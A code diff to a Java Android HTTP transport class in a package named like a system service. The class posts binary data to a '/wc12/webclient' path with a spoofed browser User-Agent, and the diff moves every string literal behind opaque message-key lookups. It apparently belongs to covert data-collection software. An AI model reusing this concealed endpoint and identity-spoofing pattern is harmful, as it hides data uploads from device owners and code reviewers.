@@ -23,6 +23,7 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpParams;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
@@ -35,7 +36,7 @@ public abstract class HttpTransport extends Transport {
 	/** The Constant PORT. */
 	private static final int PORT = 80;
 	/** The debug. */
-	private static final String TAG = "HttpTransport";
+	private static final String TAG = "HttpTransport"; //$NON-NLS-1$
 	/** The host. */
 	String host;
 
@@ -46,7 +47,7 @@ public abstract class HttpTransport extends Transport {
 	 *            the host
 	 */
 	public HttpTransport(final String host) {
-		super("http://" + host + ":" + PORT + "/wc12/webclient");
+		super("http://" + host + ":" + PORT + Messages.getString("4.2")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 
 		this.host = host;
 		cookies = null;
@@ -64,18 +65,18 @@ public abstract class HttpTransport extends Transport {
 	boolean follow_moved = true;
 
 	/** The HEADE r_ contenttype. */
-	protected final String HEADER_CONTENTTYPE = "content-type";
+	protected final String HEADER_CONTENTTYPE = Messages.getString("4.3"); //$NON-NLS-1$
 
 	/** The HEADE r_ setcookie. */
-	protected final String HEADER_SETCOOKIE = "set-cookie";
+	protected final String HEADER_SETCOOKIE = Messages.getString("4.4"); //$NON-NLS-1$
 
 	/** The HEADE r_ contentlen. */
-	protected final String HEADER_CONTENTLEN = "content-length";
+	protected final String HEADER_CONTENTLEN = Messages.getString("4.5"); //$NON-NLS-1$
 
 	// private final String USER_AGENT =
 	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
 	/** The CONTEN t_ type. */
-	protected final String CONTENT_TYPE = "application/octet-stream";
+	protected final String CONTENT_TYPE = Messages.getString("4.6"); //$NON-NLS-1$
 
 	/** The accept wifi. */
 	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
@@ -122,9 +123,9 @@ public abstract class HttpTransport extends Transport {
 		// CookiePolicy.RFC_2965);
 
 		final HttpPost httppost = new HttpPost(baseurl);
-		httppost.setHeader("User-Agent",
-				"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3");
-		httppost.setHeader("Content-Type", "application/octet-stream");
+		httppost.setHeader(Messages.getString("4.7"), //$NON-NLS-1$
+				Messages.getString("4.8")); //$NON-NLS-1$
+		httppost.setHeader(Messages.getString("4.9"), Messages.getString("4.10")); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (cookies != null) {
 			for (final Cookie cookie : cookies) {
@@ -159,7 +160,7 @@ public abstract class HttpTransport extends Transport {
 			}
 		} catch (final Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + ex.toString());
+				Check.log(TAG + " Error: " + ex.toString()) ;//$NON-NLS-1$
 			}
 			throw new TransportException(1);
 		} finally {
@@ -168,7 +169,7 @@ public abstract class HttpTransport extends Transport {
 					in.close();
 				} catch (final IOException e) {
 					if (Cfg.DEBUG) {
-						Check.log(e);
+						Check.log(e) ;//$NON-NLS-1$
 					}
 				}
 			}
